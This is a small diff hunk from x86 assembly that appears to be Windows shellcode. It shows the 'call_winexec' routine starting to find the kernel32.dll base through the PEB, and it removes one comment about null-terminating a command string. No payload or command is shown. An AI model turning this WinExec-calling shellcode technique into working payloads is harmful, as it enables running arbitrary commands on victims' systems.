@@ -44,7 +44,6 @@
     ; *************************************************************************
 code_start:
     jmp   init_cmd
-    ; nullify the end of command string
 call_winexec:
     ; obtain kernel32.dll base from PEB
     push  30h
